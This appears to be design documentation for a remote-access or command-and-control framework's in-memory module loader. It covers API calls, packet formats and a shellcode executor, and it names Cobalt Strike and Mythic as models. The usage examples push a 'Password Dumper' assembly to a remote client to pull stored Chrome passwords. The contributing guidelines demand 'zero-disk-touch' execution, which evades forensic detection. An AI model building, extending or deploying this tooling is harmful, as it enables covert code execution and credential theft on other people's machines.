# In-Memory Reflective Module Loading

## Overview

This feature implements in-memory reflective module loading, allowing custom functionality to be loaded and executed on the client without writing to disk. This is similar to Cobalt Strike's Beacon Object Files (BOF) and .NET Assembly loading capabilities, and Mythic's dynamic module system.

## Architecture

### Module Types

The system supports three types of modules:

1. **PE/DLL Modules** - Native Windows executables and dynamic libraries
2. **.NET Assemblies** - Managed .NET code (exe/dll)
3. **Shellcode** - Position-independent code

### Workflow

```
Server UI → Tauri Commands → Server Commands → Client Handler → Module Loader → Execution
                                                                        ↓
                                                                 Module Cache
                                                                        ↓
                                                    Reflective Loader / .NET Loader
                                                                        ↓
                                                              In-Memory Execution
                                                                        ↓
                                                            Results sent back to server
```

## API Reference

### Tauri Commands (Server UI → Backend)

#### `load_module`
Loads a module into the client's memory cache.

**Parameters:**
- `addr: &str` - Target client address
- `module_id: &str` - Unique module identifier
- `module_name: &str` - Human-readable name
- `module_type: &str` - Type: "PE", "DotNetAssembly", or "Shellcode"
- `module_data: Vec<u8>` - Module binary data
- `entry_point: Option<String>` - Entry point function/method name
- `description: &str` - Module description

**Example:**
```javascript
await invoke('load_module', {
  addr: '192.168.1.100:12345',
  moduleId: 'screenshot_enhance_v1',
  moduleName: 'Screenshot Enhancer',
  moduleType: 'DotNetAssembly',
  moduleData: binaryData,
  entryPoint: 'Main',
  description: 'Enhanced screenshot capture with compression'
});
```

#### `execute_module`
Executes a loaded module.

**Parameters:**
- `addr: &str` - Target client address
- `module_id: &str` - Module ID to execute
- `args: Vec<String>` - Command-line arguments
- `timeout: Option<u32>` - Execution timeout in seconds

**Example:**
```javascript
await invoke('execute_module', {
  addr: '192.168.1.100:12345',
  moduleId: 'screenshot_enhance_v1',
  args: ['--quality', '90', '--format', 'png'],
  timeout: 30
});
```

#### `unload_module`
Removes a module from the client's memory cache.

**Parameters:**
- `addr: &str` - Target client address
- `module_id: &str` - Module ID to unload

#### `list_modules`
Requests a list of loaded modules from the client.

**Parameters:**
- `addr: &str` - Target client address

#### `read_module_file`
Helper to read a module file from disk for uploading.

**Parameters:**
- `file_path: &str` - Path to module file

**Returns:** `Vec<u8>` - File contents

## Protocol Packets

### ClientboundPacket (Server → Client)

```rust
LoadModule(ModuleData)
ExecuteModule(ModuleExecution)
UnloadModule(String)  // module_id
ListModules
```

### ServerboundPacket (Client → Server)

```rust
ModuleExecutionResult(ModuleExecutionResult)
```

### Data Structures

```rust
pub struct ModuleData {
    pub id: String,
    pub name: String,
    pub module_type: ModuleType,
    pub data: Vec<u8>,
    pub entry_point: Option<String>,
    pub description: String,
}

pub struct ModuleExecution {
    pub module_id: String,
    pub args: Vec<String>,
    pub timeout: Option<u32>,
}

pub struct ModuleExecutionResult {
    pub module_id: String,
    pub success: bool,
    pub output: String,
    pub error: String,
    pub exit_code: i32,
}

pub enum ModuleType {
    PE,
    DotNetAssembly,
    Shellcode,
}
```

## Client-Side Implementation

### Module Cache

Modules are stored in an in-memory HashMap:
```rust
static MODULE_CACHE: Lazy<Arc<Mutex<HashMap<String, ModuleData>>>>
```

### Execution Flow

1. **Load Phase**: `load_module()` validates and stores module in cache
2. **Execute Phase**: `execute_module()` retrieves from cache and dispatches to appropriate loader
3. **Execution**: Module runs in separate tokio task with timeout support
4. **Result**: Execution result sent back to server

### Reflective PE Loader

The PE loader (`reflective_loader.rs`) implements:
- PE header parsing
- Section mapping to allocated memory
- Import table resolution
- Relocation processing
- Entry point or exported function invocation

**Current Status**: Basic skeleton implemented. Full implementation requires:
- Complete PE header structure parsing
- Dynamic import resolution
- Base relocation processing
- TLS callback handling

### .NET Assembly Loader

The .NET loader (`dotnet_loader.rs`) implements:
- CLR runtime initialization
- AppDomain creation
- Assembly loading from byte array
- Method invocation with argument marshaling

**Current Status**: Basic skeleton implemented. Full implementation requires:
- COM interface integration with mscoree.dll
- ICLRRuntimeHost implementation
- AppDomain management
- Method reflection and invocation

### Shellcode Executor

Shellcode execution is fully implemented:
1. Allocate executable memory with `VirtualAlloc`
2. Copy shellcode to allocated region
3. Cast memory to function pointer
4. Execute and capture return value
5. Free memory with `VirtualFree`

## Security Considerations

### Current Implementation
- Modules stored only in memory (no disk persistence)
- Encrypted transfer via existing connection encryption
- Execution in separate tasks with timeout support

### Recommended Enhancements
1. **Module Signing**: Verify module signatures before loading
2. **Sandboxing**: Execute modules in restricted contexts
3. **Memory Protection**: Use proper memory protection flags (RX not RWX)
4. **Audit Logging**: Log all module operations
5. **Access Control**: Restrict module loading to authorized operators

## Usage Examples

### Example 1: Load and Execute a .NET Assembly

```javascript
// 1. Read module file
const moduleData = await invoke('read_module_file', {
  filePath: 'C:\\modules\\PasswordDumper.exe'
});

// 2. Load module
await invoke('load_module', {
  addr: clientAddr,
  moduleId: 'password_dumper_v2',
  moduleName: 'Password Dumper',
  moduleType: 'DotNetAssembly',
  moduleData: moduleData,
  entryPoint: 'Main',
  description: 'Extract stored passwords'
});

// 3. Execute module
await invoke('execute_module', {
  addr: clientAddr,
  moduleId: 'password_dumper_v2',
  args: ['--browser', 'chrome'],
  timeout: 60
});

// 4. Listen for results
listen('module-execution-result', (event) => {
  console.log('Module output:', event.payload.output);
  console.log('Success:', event.payload.success);
});
```

### Example 2: Execute Shellcode

```javascript
// Shellcode that displays a message box
const shellcode = new Uint8Array([
  // ... shellcode bytes ...
]);

await invoke('load_module', {
  addr: clientAddr,
  moduleId: 'msgbox_shellcode',
  moduleName: 'Message Box',
  moduleType: 'Shellcode',
  moduleData: Array.from(shellcode),
  entryPoint: null,
  description: 'Display message box'
});

await invoke('execute_module', {
  addr: clientAddr,
  moduleId: 'msgbox_shellcode',
  args: [],
  timeout: 10
});
```

### Example 3: Manage Module Lifecycle

```javascript
// Load module
await invoke('load_module', { /* ... */ });

// Execute multiple times
await invoke('execute_module', { moduleId: 'my_module', args: ['scan'] });
await invoke('execute_module', { moduleId: 'my_module', args: ['dump'] });
await invoke('execute_module', { moduleId: 'my_module', args: ['clean'] });

// Unload when done
await invoke('unload_module', {
  addr: clientAddr,
  moduleId: 'my_module'
});
```

## Development Roadmap

### Phase 1: Core Infrastructure ✅
- [x] Packet definitions
- [x] Module cache management
- [x] Basic loader skeletons
- [x] Server/client communication
- [x] Tauri API endpoints

### Phase 2: PE Reflective Loader (TODO)
- [ ] Complete PE header parsing
- [ ] Section mapping implementation
- [ ] Import table resolution
- [ ] Relocation processing
- [ ] Exception handling
- [ ] TLS callback support

### Phase 3: .NET Assembly Loader (TODO)
- [ ] CLR runtime initialization
- [ ] AppDomain management
- [ ] Assembly.Load implementation
- [ ] Method invocation
- [ ] Parameter marshaling
- [ ] Output capture

### Phase 4: Security & Testing (TODO)
- [ ] Module signature verification
- [ ] Memory protection improvements
- [ ] Comprehensive error handling
- [ ] Unit tests
- [ ] Integration tests
- [ ] Security audit

### Phase 5: UI & Documentation (TODO)
- [ ] Module management UI
- [ ] Module library interface
- [ ] Upload/download UI
- [ ] Execution history
- [ ] Usage tutorials
- [ ] Example modules

## Technical References

### Reflective PE Loading
- [Stephen Fewer's Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- [Windows PE Format Documentation](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Reflective PE Loader by Matt Graeber](https://github.com/mattifestation/PSReflect)

### .NET CLR Hosting
- [Hosting the CLR](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/)
- [ICLRRuntimeHost Interface](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface)
- [Execute-Assembly by Ryan Cobb](https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Execution/Assembly.cs)

### Similar Implementations
- [Cobalt Strike BOF](https://www.cobaltstrike.com/help-beacon-object-files)
- [Mythic Agent Development](https://docs.mythic-c2.net/)
- [SilentTrinity](https://github.com/byt3bl33d3r/SILENTTRINITY)
- [Covenant](https://github.com/cobbr/Covenant)

## Contributing

When extending this module:

1. **Maintain Zero-Disk-Touch**: Never write modules to disk
2. **Clean Up Memory**: Always free allocated memory
3. **Error Handling**: Provide detailed error messages
4. **Security**: Consider security implications of all changes
5. **Testing**: Test with various module types and edge cases
6. **Documentation**: Update this file with new capabilities

## License

Same as parent project (MIT License)
